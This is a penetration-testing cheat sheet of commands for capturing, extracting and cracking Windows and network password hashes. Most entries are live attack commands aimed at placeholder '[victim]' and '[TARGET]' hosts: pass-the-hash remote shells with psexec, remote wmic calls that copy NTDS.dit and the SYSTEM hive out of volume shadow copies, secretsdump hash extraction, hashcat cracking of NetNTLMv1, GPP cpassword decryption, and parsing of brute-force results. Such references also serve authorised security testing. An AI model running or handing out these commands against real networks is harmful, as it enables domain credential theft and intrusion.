### 1. PSExec with hashses
```
psexec.py -hashes [LM]:[NTLM] [DOM]/[USER]@[TARGET] "cmd.exe"
```
**- linux,impacket,remote command shell,hashes**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 2. hashcat assuming that hc is an alias (kraken | pablo)
```
hc --gpu-temp-abort=100 --remove -m5500 netntlmv1.hash -a3 -1 '?u?l?d' '?1?1?1?1?1?1?1?1' -o hash.crack
```
**- linux,hashes,cracking**
#### References:

https://hashcat.net/wiki/
__________
### 3. hashcat types
```
500  MD5 Crypt $1 | 7400 SHA256 Crypt $5 | 1800 Sha512 Crypt $6
```
**- hashes,cracking,reference**
#### References:

https://hashcat.net/wiki/doku.php?id=example_hashes
__________
### 4. hashcat types
```
1000 NTLM | 3000 LM
```
**- hashes,cracking,reference**
#### References:

https://hashcat.net/wiki/doku.php?id=example_hashes
__________
### 5. hashcat types
```
1100 MScashv1 | 2100 MScashv2 (802.1X)
```
**- hashes,cracking,reference**
#### References:

https://hashcat.net/wiki/doku.php?id=example_hashes
__________
### 6. hashcat types
```
2500 WPA/WPA2
```
**- hashes,cracking,reference**
#### References:

https://hashcat.net/wiki/doku.php?id=example_hashes
__________
### 7. hashcat types
```
5600 NetNTLMv2 | 5500 NetNTLMv1 | 5400 = IKE-PSK SHA1 | 5300 = IKE-PSK MD5 |
```
**- hashes,cracking,reference**
#### References:

https://hashcat.net/wiki/doku.php?id=example_hashes
__________
### 8. List volume shadow copies
```
wmic /node:[victim] /user:"[domain]\[user]" /password:[pass] process call create "cmd /c vssadmin list shadows 2 &1 >> c:\temp\vss.txt"
```
**- Windows,hashes**
#### References:

https://yg.ht
https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
__________
### 9. create volume shadow copy for c
```
wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c vssadmin create shadow /for=C: 2 &1 >> C:\temp\create_vss.txt"
```
**- Windows,hashes**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
__________
### 10. copy system out of a volume shadow copy
```
wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c copy \\?\GLOBALROOT\Device\[vsc]\Windows\System32\config\SYSTEM c:\temp\SYSTEM" 2 &1 >> c:\temp\copy_system.txt
```
**- Windows,hashes**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
__________
### 11. copy out ntds from the voulme shadow copy
```
wmic /node:[victim] /User:[domain]\[user]" /password:[pass] process call create "cmd /c copy \\?\GLOBALROOT\Device\[vsc]\NTDS\NTDS.dit c:\temp\ntds.dit" 2 &1 >> c:\temp\copy_ntds.txt
```
**- Windows,hashes**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
http://bernardodamele.blogspot.co.uk/2011/12/dump-windows-password-hashes.html
__________
### 12. Parse the SYSTEM and ntds with impacket
```
secretsdump.py  -hashes LMHASH:NTHASH -system ../SYSTEM -ntds ../ntds.dit local | tee hashes
```
**- Windows,impacket,hashes**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 13. hash list
```
https://hashcat.net/wiki/doku.php?id=example_hashes
```
**- hashes,web address**
#### References:

https://hashcat.net/wiki/doku.php?id=example_hashes
__________
### 14. Hash byte lengths
```
hash lengths : MD5=16 | SHA1=20 | SHA256=32 | SHA512=64
```
**- hashes,reference**
#### References:

https://en.wikipedia.org/wiki/List_of_hash_functions
__________
### 15. Decrypt group policy preferences password aka Cpassword, use LAPS not GPP
```
/usr/bin/gpp-decrypt [cpassword]
```
**- smb,privilege escalation,hashes**
#### References:

http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html
__________
### 16. Grab Succsessfull passwords from a tee'd medusa, bah to spaces in usernames
```
cat [file]  | grep "ACCOUNT FOUND" | grep -v 0x000072:STATUS_ACCOUNT_DISABLED | awk  -F User: '{print $2}' | awk -F : '{print $1, $2}' | awk -F \\[SUC '{print $1}' | awk -F " Password  " '{print $1":"$2}' | sort | sed s/' '/''/| uniq 
```
**- scanning,hashes**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
http://foofus.net/goons/jmk/medusa/medusa.html
__________
